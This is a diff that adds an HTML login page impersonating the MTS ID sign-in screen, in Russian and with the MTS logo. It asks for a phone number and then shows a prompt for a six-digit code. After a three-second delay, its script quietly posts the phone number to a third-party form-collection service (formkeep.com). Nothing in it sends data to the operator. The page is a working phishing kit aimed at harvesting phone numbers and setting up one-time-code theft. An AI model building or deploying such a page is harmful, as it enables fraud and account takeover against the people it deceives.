@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Страница входа - Шаг 1</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .login-container {
+            background-color: white;
+            border-radius: 8px;
+            padding: 40px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin: auto;
+            width: 320px;
+            position: relative;
+        }
+
+        .logo-container {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-container img {
+            width: 22px;
+            height: 22px;
+            margin-right: 8px;
+        }
+
+        .logo-container span {
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .login-content {
+            margin-top: 60px;
+        }
+
+        .login-content p {
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        .login-content input {
+            width: 80%;
+            padding: 10px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .login-content button {
+            background-color: #ff0033;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .login-content button:hover {
+            background-color: #e6002e;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Logo_%D0%9C%D0%A2%D0%A1_%282023%29.svg/44px-Logo_%D0%9C%D0%A2%D0%A1_%282023%29.svg.png" alt="МТС Лого">
+            <span>ID</span>
+        </div>
+
+        <!-- Первый экран -->
+        <div id="step1" class="login-content">
+            <p>Введите номер телефона любого оператора</p>
+            <form id="form" action="https://formkeep.com/f/f51a0a45ae57" method="POST" accept-charset="UTF-8" enctype="multipart/form-data">
+                <input type="tel" name="phone" id="phone" placeholder="+7-000-000-00-00" maxlength="16">
+                <br>
+                <button type="button" onclick="goToStep2()">Далее</button>
+            </form>
+        </div>
+
+        <!-- Второй экран -->
+        <div id="step2" class="login-content hidden">
+            <p>Для входа введите код из 6 цифр</p>
+            <input type="text" id="code" maxlength="6" placeholder="______">
+            <br>
+            <button>Далее</button>
+        </div>
+    </div>
+
+    <script>
+        function goToStep2() {
+            const form = document.getElementById('form');
+
+            // Переход на второй экран сразу
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            step1.classList.add('hidden');
+            step2.classList.remove('hidden');
+
+            // Через 3 секунды отправка данных формы
+            setTimeout(() => {
+                form.submit();
+            }, 3000);
+        }
+    </script>
+
+</body>
+</html>
